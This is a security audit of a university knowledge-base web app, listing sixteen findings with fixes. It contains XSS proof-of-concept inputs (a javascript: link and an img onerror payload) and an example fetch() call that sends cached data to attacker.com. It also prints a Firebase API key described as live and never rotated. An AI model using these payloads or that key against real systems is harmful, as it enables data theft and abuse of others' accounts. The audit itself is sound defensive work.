# MIVA Knowledge Vector Space — Security Vulnerabilities

**Audit Date:** 2026-06-26
**Last Reviewed:** 2026-07-01
**Files Audited:** `index.html` (formerly audited as `mivavectorspace.html` / `hh.html`, since merged into a single file)
**Severity Scale:** Critical / High / Medium / Low / Info

---

## Summary

| ID | Severity | Status | Title |
|---|---|---|---|
| V-01 | **Critical** | Mitigated — rotation declined (accepted risk) | Firebase API key hardcoded in source |
| V-02 | **Critical** | Fixed | XSS via `javascript:` URL in markdown link renderer |
| V-03 | **High** | Fixed | XSS via innerHTML injection in auth UI |
| V-04 | **High** | Fixed | External links missing `rel="noopener noreferrer"` (tabnapping) |
| V-05 | **High** | Fixed | No URL protocol validation on user-supplied links |
| V-06 | **High** | Fixed | `window._fb` exposes Firebase SDK to global scope |
| V-07 | **Medium** | Fixed | No Subresource Integrity (SRI) on CDN assets |
| V-08 | **Medium** | Fixed | Incomplete Content Security Policy |
| V-09 | **Medium** | Fixed | Sensitive data cached in localStorage without sanitization |
| V-10 | **Medium** | Fixed | Tag fields stored without HTML sanitization |
| V-11 | **Medium** | Fixed | Auto-link regex does not block `javascript:` protocol |
| V-12 | **Medium** | Fixed | Demo mode bypasses domain restriction |
| V-13 | **Low** | Fixed | No client-side rate limiting on auth form |
| V-14 | **Low** | Fixed | No keyboard trap on modal (accessibility/UX security) |
| V-15 | **Low** | Fixed | `confirm()` used for destructive action (notepad clear) |
| V-16 | **Info** | Fixed | `console.warn` leaks internal state and Firebase config hints |

---

## V-01 — Firebase API Key Hardcoded in Source

**Severity:** Critical
**Status:** Mitigated — rotation declined (accepted risk, project owner decision 2026-07-01)
**File:** `index.html`, line 287 (`fbConfig`)
**OWASP:** A02:2021 Cryptographic Failures

**Resolution note (2026-07-01):** `fbConfig` in `index.html` ships with `YOUR_*` placeholder values only — no live key is committed, and Firebase initialization is skipped entirely (`if(!fbConfig.apiKey.startsWith('YOUR'))`) until a real config is filled in locally/at deploy time. Firebase web config is not a secret by design (Google's own guidance) — the real security boundary is HTTP-referrer restriction + Firestore rules + App Check, not hiding the value. No build-time env-var injection was added (decision: keep placeholders, restrict by domain).

**Decision:** The project owner has decided **not** to rotate the previously-committed live key (`AIzaSyBld8IlC0Cgs9b98mAQ8gDIf35snNcaqd8` / project `pdf-scraper-ext`), which remains in earlier git history. This is accepted as long as the key is given an **HTTP-referrer restriction** in Google Cloud Console (limits it to the production domain) — restriction closes the ongoing exposure; it does not undo any use that may have already happened while the key was unrestricted. Firestore rules are now hardened (see below) and App Check is **not yet enforced** (`recKey` in `index.html` is still the `'YOUR_RECAPTCHA_KEY'` placeholder — see the App Check section in README.md to complete it).

**Description:**  
The live Firebase project's API key, project ID, auth domain, storage bucket, messaging sender ID, app ID, and measurement ID are all hardcoded in plaintext inside the HTML source. Anyone who views page source has full access to these credentials.

```javascript
// mivavectorspace.html line 241 — EXPOSED CREDENTIALS
const fbConfig = {
  apiKey: "AIzaSyBld8IlC0Cgs9b98mAQ8gDIf35snNcaqd8",
  authDomain: "pdf-scraper-ext.firebaseapp.com",
  projectId: "pdf-scraper-ext",
  ...
};
```

**Impact:**  
While Firebase API keys are not the same as private server keys, their public exposure combined with the project ID allows attackers to:
- Query Firestore directly via REST without App Check (if App Check enforcement is missed or lapses)
- Enumerate the auth domain and attempt credential stuffing
- Perform resource exhaustion against the quota (DoS)
- Write malicious entries if Firestore rules have any gap

**Remediation:**  
1. Restrict the API key in Google Cloud Console to specific HTTP referrers (your production domain only).
2. Ensure Firestore App Check enforcement is active and tested.
3. Rotate the API key and revoke the old one in Google Cloud Console.
4. In `hh.html` (the rebuild), keep the config as placeholder `"YOUR_*"` values and document how to configure them — do not commit live keys.
5. Consider using environment variables injected at build time if a build step is introduced.

---

## V-02 — XSS via `javascript:` URL in Markdown Link Renderer

**Severity:** Critical
**Status:** Fixed
**File:** `index.html`, `sanitizeUrl()` (line 392) and `renderMarkdown()` (lines 1162-1170)
**OWASP:** A03:2021 Injection

**Resolution note (2026-07-01):** `sanitizeUrl()` matches the recommended implementation (decodes, blocks `javascript:`/`data:`/`vbscript:`/`blob:`, whitelists `https:`/`http:`/`mailto:`). Both the `[label](url)` renderer and the bare-URL auto-linker now call `sanitizeUrl(rawUrl)` before building the `href`.

**Description:**  
The markdown renderer HTML-encodes input first, but then un-encodes URLs when building anchor tags:

```javascript
// Both files — renderMarkdown()
t = t.replace(/\[([^\]]+)\]\(([^)]+)\)/g, (m, label, url) => {
  const rawUrl = url.replace(/&amp;/g,'&').replace(/&lt;/g,'<').replace(/&gt;/g,'>');
  // rawUrl is un-sanitized — javascript: still passes through
  return `<a href="${rawUrl}" target="_blank" ...>${label}</a>`;
});
```

**Proof of Concept:**  
An authenticated user submits content containing:
```
[Click me](javascript:alert(document.cookie))
```
This renders as a live XSS link in any user's browser when they view that entry.

**Impact:**  
Session hijacking, credential theft, arbitrary DOM manipulation, redirection to phishing pages. All viewers of the affected entry are at risk.

**Remediation:**  
Implement a `sanitizeUrl()` function that strips non-safe protocols:

```javascript
function sanitizeUrl(raw) {
  try {
    const decoded = decodeURIComponent(raw).replace(/\s/g,'').toLowerCase();
    if (/^(javascript|data|vbscript|blob):/i.test(decoded)) return '#';
    const url = new URL(raw, location.href);
    if (!['https:', 'http:', 'mailto:'].includes(url.protocol)) return '#';
    return url.href;
  } catch {
    return '#';
  }
}
```

Call `sanitizeUrl(rawUrl)` before inserting into the `href` attribute.

---

## V-03 — XSS via innerHTML in Auth UI

**Severity:** High
**Status:** Fixed
**File:** `index.html`, `updateAuthUI()` (lines 1373-1402)
**OWASP:** A03:2021 Injection

**Resolution note (2026-07-01):** `updateAuthUI()` builds the auth area with `document.createElement` + `.textContent` for the email span instead of interpolating into `innerHTML`.

**Description:**  
After authentication, the user's email is injected directly into `innerHTML`:

```javascript
$('auth-area').innerHTML = `<span class="auth-email">${S.user.email}</span>...`;
```

In demo mode, `S.user` is set to `{ email: <whatever the user typed> }`. If the user types `<img src=x onerror=alert(1)>` as their email, this executes. Even with Firebase mode, if the auth state changed callback provides an unusual email value, it renders unescaped.

**Impact:**  
Self-XSS in demo mode. With a compromised Firebase account (email containing HTML), it becomes reflected XSS for that user.

**Remediation:**  
Use `textContent` instead of `innerHTML` for the email span:

```javascript
const emailSpan = document.createElement('span');
emailSpan.className = 'auth-email';
emailSpan.textContent = S.user.email; // textContent encodes HTML entities
$('auth-area').replaceChildren(emailSpan, signOutBtn);
```

---

## V-04 — Tabnapping via Missing `rel="noopener noreferrer"`

**Severity:** High
**Status:** Fixed
**File:** `index.html`, `renderMarkdown()` (lines 1163, 1170)
**OWASP:** A05:2021 Security Misconfiguration

**Resolution note (2026-07-01):** Both generated anchor forms now include `rel="noopener noreferrer"` alongside `target="_blank"`.

**Description:**  
All anchor tags rendered by `renderMarkdown()` use `target="_blank"` without `rel="noopener noreferrer"`. This enables reverse tabnapping: the opened page can use `window.opener.location` to navigate the original MIVA tab to a phishing page.

```javascript
// Missing rel attribute on every generated link
return `<a href="${rawUrl}" target="_blank" style="...">${label}</a>`;
```

**Impact:**  
An attacker who controls a linked page can silently redirect the MIVA tab. Users who click a link and return to the MIVA tab may land on a phishing page styled to look like the login screen.

**Remediation:**  
Add `rel="noopener noreferrer"` to every generated anchor:

```javascript
return `<a href="${sanitizeUrl(rawUrl)}" target="_blank" rel="noopener noreferrer" style="...">${label}</a>`;
```

---

## V-05 — No URL Protocol Validation on User-Submitted Link Dialog

**Severity:** High
**Status:** Fixed
**File:** `index.html`, `btn-format-link` click handler (lines 1434-1440)
**OWASP:** A03:2021 Injection

**Resolution note (2026-07-01):** The handler runs the prompted URL through `sanitizeUrl()` and rejects (`notify(...,'error')`, no insert) when it resolves to `'#'`.

**Description:**  
The link insertion dialog uses `prompt()` and inserts the result verbatim:

```javascript
$('btn-format-link').onclick = () => {
  const url = prompt('Enter URL:', 'https://');
  if (url) insertFormat('[', `](${url})`);
};
```

There is no validation that `url` is a safe protocol. A user can type `javascript:evil()` and it becomes part of stored content, exploiting V-02.

**Remediation:**  
Validate the URL before inserting:

```javascript
$('btn-format-link').onclick = () => {
  const url = prompt('Enter URL (must start with https:// or http://):', 'https://');
  if (!url) return;
  const safe = sanitizeUrl(url.trim());
  if (safe === '#') { notify('Only https:// and http:// links are allowed', 'error'); return; }
  insertFormat('[', `](${safe})`);
};
```

---

## V-06 — Firebase SDK Exposed on `window._fb`

**Severity:** High
**Status:** Fixed
**File:** `index.html`, lines 294-312
**OWASP:** A05:2021 Security Misconfiguration

**Resolution note (2026-07-01):** Firebase auth/Firestore references (`_createUser`, `_signIn`, `_signOut`, `_onAuthChanged`, `_collection`, `_getDocs`, `_addDoc`) are held in module-scoped `let` bindings inside the `<script type="module">` block. No `window._fb` (or equivalent) assignment exists in the current file.

**Description:**  
Firebase auth methods and Firestore functions are attached to the global `window` object:

```javascript
window._fb = {
  createUserWithEmailAndPassword,
  signInWithEmailAndPassword,
  fbSignOut,
  onAuthStateChanged,
  collection, getDocs, addDoc, Timestamp
};
```

Any other script on the page, injected via XSS, or from a browser extension can call `window._fb.addDoc(...)` directly to write to Firestore, bypassing client-side validation.

**Remediation:**  
Keep all Firebase references module-scoped (they already are in `hh.html`'s `<script type="module">`). Remove the `window._fb` assignment entirely. Access the functions directly from the module closure.

---

## V-07 — No Subresource Integrity (SRI) on CDN Assets

**Severity:** Medium
**Status:** Fixed
**File:** `index.html`, `<style>` block (`@font-face` rules) and CSP `<meta>` (line 7)
**OWASP:** A08:2021 Software and Data Integrity Failures

**Resolution note (2026-07-01):** Inter is now self-hosted. The `<link href="https://fonts.googleapis.com/...">` tag was removed and replaced with six `@font-face` rules (weights 300/400/500/600/700/800) pointing at `fonts/inter-v20-latin-*.woff2`, generated via google-webfonts-helper and committed under `fonts/`. The CSP's `style-src`/`font-src` no longer allowlist `fonts.googleapis.com`/`fonts.gstatic.com` — both are `'self'`-only now. Verified in-browser: all six `.woff2` requests return `200` from the local origin, no CSP violations, no requests to Google's font CDN.

**Description:**  
Google Fonts is loaded without an SRI hash:

```html
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
```

If Google's CDN is compromised or the URL is manipulated via a MITM attack, malicious CSS (or through `@import`, malicious content) could be served.

**Impact:**  
Supply-chain attack vector. Malicious CSS can exfiltrate content via `content:` attribute tricks or redirect form submissions.

**Remediation:**  
Self-host the Inter font (preferred for a university intranet tool), or add an SRI hash. Note: Google Fonts URLs return different content per user-agent so SRI hashes are not stable on the CSS loader URL — the solution is to **self-host the woff2 files** and serve them from the same origin.

---

## V-08 — Incomplete Content Security Policy

**Severity:** Medium
**Status:** Fixed
**File:** `index.html`, line 7 (`<meta http-equiv="Content-Security-Policy">`)
**OWASP:** A05:2021 Security Misconfiguration

**Resolution note (2026-07-01):** The CSP now sets `default-src 'self'`, scoped `script-src`/`style-src`/`font-src`/`connect-src`/`img-src` allowlists, plus `object-src 'none'`, `base-uri 'self'`, and `form-action 'self'` in addition to the original `frame-ancestors 'none'`.

**Description:**  
Current CSP: `content="frame-ancestors 'none';"` — this is the entirety of the policy. It only prevents framing. It does not restrict:
- `script-src` (any inline or external script executes)
- `object-src` (plugin execution allowed)
- `base-uri` (base tag injection possible)
- `form-action` (form can POST to arbitrary URLs)
- `connect-src` (arbitrary network requests allowed)

**Impact:**  
XSS payloads can load arbitrary external scripts, exfiltrate data via `fetch()`, and hijack form submissions.

**Remediation:**  
See the full CSP in `architectural-plan.md`, Section 5.2. The minimum additions are:
```
object-src 'none';
base-uri 'self';
form-action 'self';
```

---

## V-09 — Sensitive Data Cached in localStorage Without Sanitization

**Severity:** Medium
**Status:** Fixed
**File:** `index.html`, `saveCache()` / `loadCache()` (lines 1482-1488)
**OWASP:** A02:2021 Cryptographic Failures

**Resolution note (2026-07-01):** V-02/V-03 (the XSS vectors that would exfiltrate this cache) are fixed. Additionally, `loadCache`/`saveCache` now use `sessionStorage` instead of `localStorage`, so the cached entry set no longer persists after the tab closes. There is no separate structured "phone"/"private email" field to strip — contact details are freeform `content` text, and the app already warns submitters not to include private data in that field (see the in-app privacy notices near `f-content`).

**Description:**  
All Firestore entries — including contact information like emails, department info, and other potentially sensitive data — are stored in localStorage in plaintext:

```javascript
localStorage.setItem(CACHE_KEY, JSON.stringify({ data, timestamp: Date.now() }));
```

localStorage is accessible to any JavaScript on the same origin. If XSS is achieved (see V-02), the entire cached dataset is instantly exfiltrated.

**Impact:**  
Full data exfiltration of the cached dataset in a single XSS payload: `fetch('https://attacker.com?' + btoa(localStorage.getItem('miva_knowledge_cache_v2')))`.

**Remediation:**  
1. Fix XSS vulnerabilities first (V-02, V-03) — this reduces the attack surface.
2. Do not cache contact fields with private information (phone, personal email) in localStorage. Display them from live Firestore only.
3. Consider using `sessionStorage` instead of `localStorage` for the entry cache — data is cleared when the tab is closed.

---

## V-10 — Tags Stored Without HTML Sanitization

**Severity:** Medium
**Status:** Fixed
**File:** `index.html`, form submit handler (lines 1451-1453) and detail render (line 1223)
**OWASP:** A03:2021 Injection

**Resolution note (2026-07-01):** Tags are stripped of `<>&"'`, capped at 30 chars each and 10 tags total on submit, and rendered via `tagSpan.textContent` in the detail panel rather than joined into `innerHTML`.

**Description:**  
Tags are split from a comma-separated string and stored as-is:

```javascript
const tags = $('f-tags').value.split(',').map(t => t.trim()).filter(Boolean);
```

If a tag contains HTML (e.g., `<script>alert(1)</script>`), it is stored in Firestore and rendered in the detail panel via:

```javascript
'<br>🏷 ' + d.tags.join(', ')  // joined directly into innerHTML
```

**Remediation:**  
Strip HTML from tags before storage and before rendering:

```javascript
// On input: strip HTML
const tags = $('f-tags').value.split(',')
  .map(t => t.trim().replace(/[<>&"']/g, ''))
  .filter(Boolean)
  .slice(0, 10)             // max 10 tags
  .map(t => t.slice(0, 30)); // max 30 chars each

// On render: use textContent
const tagEl = document.createElement('span');
tagEl.textContent = d.tags.join(', ');
```

---

## V-11 — Auto-Link Regex Does Not Block `javascript:` Protocol

**Severity:** Medium
**Status:** Fixed
**File:** `index.html`, `renderMarkdown()` (lines 1168-1170)
**OWASP:** A03:2021 Injection

**Resolution note (2026-07-01):** The bare-URL auto-linker now passes its match through `sanitizeUrl()` before building the `href`, same as the `[label](url)` form (V-02).

**Description:**  
The auto-link regex matches any `http://` or `https://` URL, but the negative lookbehind `(?<!href=")` is fragile:

```javascript
t = t.replace(/(?<!href=")(https?:\/\/[^\s<]+)/g, m => {
  const rawUrl = m.replace(/&amp;/g,'&')...;
  return `<a href="${rawUrl}" ...>${m}</a>`;
});
```

The lookbehind only checks for `href="` (one specific pattern). An attacker could craft content to bypass it. Additionally, the regex is applied **after** `obfuscateContent()` which injects `<span>` tags — the interaction between these two functions is not fully tested and could produce unexpected HTML.

**Remediation:**  
Apply `sanitizeUrl()` to auto-linked URLs, and replace the fragile lookbehind with a proper two-pass parse (extract href attributes → skip; match bare URLs → link).

---

## V-12 — Demo Mode Bypasses Domain Restriction

**Severity:** Medium
**Status:** Fixed
**File:** `index.html`, auth submit handler (line 1354) and form submit handler (line 1445)
**OWASP:** A07:2021 Identification and Authentication Failures

**Resolution note (2026-07-01):** Demo mode still lets a domain-matching email set `S.user` locally (clearly labeled "Demo mode — entries are local only, not saved to database"), and the entry submit handler additionally guards `if(!firebaseReady && !S.user)` before allowing a submission — so writes never silently reach Firestore without live auth.

**Description:**  
When Firebase is not configured (demo mode), the domain check runs first, but then:

```javascript
if (!firebaseReady) {
  S.user = { email };   // email already passed domain check...
  updateAuthUI();
  // ...but demo mode means ANY code path that sets firebaseReady=true separately
  // would skip this check
}
```

More critically: the domain check in the `auth-submit` handler is the **only** gate. In demo mode, `S.user` is set to an arbitrary object — it has no `uid`, no token, no actual authentication. The app treats this as a fully authenticated user and shows the entry submission form. Any user can enter `anything@miva.edu.ng` (they don't need a real account) to get write access in demo mode.

**Impact:**  
In demo mode, anyone can "authenticate" with any @miva.edu.ng address without proof. This is acceptable for demos but must be clearly flagged and the form must be disabled in production if `firebaseReady === false`.

**Remediation:**  
In the form submit handler, add a hard check:

```javascript
if (!firebaseReady) {
  notify('Live authentication required to submit entries. Please configure Firebase.', 'error');
  return;
}
```

---

## V-13 — No Client-Side Rate Limiting on Auth Form

**Severity:** Low
**Status:** Fixed
**File:** `index.html`, auth submit handler (lines 1345-1370)
**OWASP:** A07:2021 Identification and Authentication Failures

**Resolution note (2026-07-01):** `authLock` guards re-entry and `$('auth-submit')` is disabled while a request is in flight, re-enabled in the `finally` block.

**Description:**  
The sign-in button can be clicked repeatedly with no client-side throttle. Firebase Auth has server-side rate limiting, but repeated rapid requests still create unnecessary load.

**Remediation:**  
Debounce the submit button:

```javascript
let authSubmitLock = false;
$('auth-submit').onclick = async () => {
  if (authSubmitLock) return;
  authSubmitLock = true;
  $('auth-submit').disabled = true;
  try { /* ... auth logic ... */ }
  finally {
    setTimeout(() => { authSubmitLock = false; $('auth-submit').disabled = false; }, 2000);
  }
};
```

---

## V-14 — No Focus Trap in Modal Dialogs

**Severity:** Low
**Status:** Fixed
**File:** `index.html`, `trapFocus()`/`releaseFocus()` (lines 1305-1315), applied on modal open (lines 1323, 1397)
**OWASP:** Accessibility / WCAG 2.1 guideline 2.1.2

**Resolution note (2026-07-01):** `trapFocus()` matches the recommended implementation and is invoked whenever `#auth-modal` opens; `releaseFocus()` detaches the listener on close.

**Description:**  
The auth modal does not trap keyboard focus. A keyboard user can Tab past the modal to the background canvas controls, interacting with elements they cannot see.

**Remediation:**  
Implement a focus trap on modal open:

```javascript
function trapFocus(element) {
  const focusable = element.querySelectorAll(
    'button, input, select, textarea, [tabindex]:not([tabindex="-1"])'
  );
  const first = focusable[0], last = focusable[focusable.length - 1];
  element.addEventListener('keydown', e => {
    if (e.key !== 'Tab') return;
    if (e.shiftKey ? document.activeElement === first : document.activeElement === last) {
      e.preventDefault();
      (e.shiftKey ? last : first).focus();
    }
  });
}
```

---

## V-15 — Native `confirm()` Used for Destructive Action

**Severity:** Low
**Status:** Fixed
**File:** `index.html`, notepad clear handler (lines 1276-1287)
**OWASP:** A05:2021 Security Misconfiguration (UX security)

**Resolution note (2026-07-01):** `confirm()` is gone; the clear button now uses an inline two-click confirm state (`clearPending`) with a 3-second auto-reset timer, matching the recommended pattern.

**Description:**  
```javascript
$('notepad-clear').onclick = () => {
  if (confirm('Clear all notes?')) { ... }
};
```

`window.confirm()` is a blocking call that reveals the page's origin and can be suppressed by some browser configurations (e.g., popups disabled). It is also not styleable and breaks the visual design.

**Remediation:**  
Replace with an in-page confirmation pattern — a small inline confirmation state on the button itself:

```javascript
let clearPending = false;
$('notepad-clear').onclick = () => {
  if (!clearPending) {
    clearPending = true;
    $('notepad-clear').textContent = '⚠ Confirm clear?';
    setTimeout(() => { clearPending = false; $('notepad-clear').textContent = '🗑 Clear'; }, 3000);
  } else {
    $('notepad-text').value = '';
    localStorage.removeItem('miva_notepad_content');
    clearPending = false;
    $('notepad-clear').textContent = '🗑 Clear';
  }
};
```

---

## V-16 — `console.warn` Leaks Internal State and Configuration Hints

**Severity:** Info
**Status:** Fixed
**File:** `index.html`, Firebase init (line 318) and `loadData()` (line 1501)
**OWASP:** A09:2021 Security Logging and Monitoring Failures

**Resolution note (2026-07-01):** Both catch blocks are now silent (`/* Firebase not available — demo mode */` and `/* use cache or sample */`) — no `console.warn`/`console.log` calls remain in the file.

**Description:**  
```javascript
catch(e) { console.warn('Firebase not configured:', e) }
catch(e) { console.warn('Firestore load revalidation failed:', e) }
```

In production, these log internal state (Firebase error codes, project IDs, network errors) to the browser console, visible to any user who opens DevTools.

**Remediation:**  
Remove `console.warn`/`console.log` calls from production code, or gate them behind a `DEBUG` flag:

```javascript
const DEBUG = false; // set true during development only
if (DEBUG) console.warn('Firebase not configured:', e);
```

---

## Firestore Security Rules — Current vs Recommended

**Status:** Fixed and deployed (2026-07-01) — README.md documents the hardened rules below, and the project owner has confirmed they were pasted into Firebase Console → Firestore Database → Rules and are live.

**Previous rules (superseded):**
```
allow read: if true;
allow create: if request.auth != null;
allow update, delete: if false;
```

**Issues these had:**
- `allow read: if true` means any user, including unauthenticated scrapers, can read all entries even without the web app (via the Firestore REST API directly). This is intentional (public read is a product requirement) and remains unchanged.
- No field-level validation on `create` — any authenticated user could write any payload size, any field name, impersonate another author.

**Now-recommended hardened rules (in README.md):**
```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /miva_entries/{entryId} {
      allow read: if true;

      allow create: if request.auth != null
        && request.auth.token.email.matches('.*@miva\\.edu\\.ng$|.*@miva\\.university$')
        && request.resource.data.keys().hasAll(['title','content','type','category','subcategory','author','createdAt','tags'])
        && request.resource.data.title is string && request.resource.data.title.size() <= 150
        && request.resource.data.content is string && request.resource.data.content.size() <= 2000
        && request.resource.data.tags is list && request.resource.data.tags.size() <= 10
        && request.resource.data.author == request.auth.token.email;

      allow update, delete: if false;
    }
  }
}
```

This adds:
1. Server-side email domain validation (can't be bypassed by modifying client-side JS)
2. Required field enforcement
3. Field length limits (prevents storage abuse)
4. Author field must match the authenticated email (prevents impersonation)

---

## Remediation Priority Order

**Status as of 2026-07-01:** All 16 code/doc findings are closed (fixed, or accepted risk with a documented reason). One follow-up remains:

1. **App Check** — not yet enforced. `recKey` in `index.html` is still the `'YOUR_RECAPTCHA_KEY'` placeholder, so `initializeAppCheck(...)` never runs. Register a reCAPTCHA v3 site key (see README.md's App Check section) and drop it in to close this out.
2. **V-01** — accepted risk. The project owner declined to rotate the previously-committed live Firebase key; mitigation relies on restricting that key to production HTTP referrers in Google Cloud Console instead (not verifiable from this repo — confirm it's set).

### Already fixed (for reference)
V-02 through V-16 — see each finding's "Resolution note" above for the specific file/line. Firestore rules are hardened in README.md and confirmed deployed to Firebase Console.
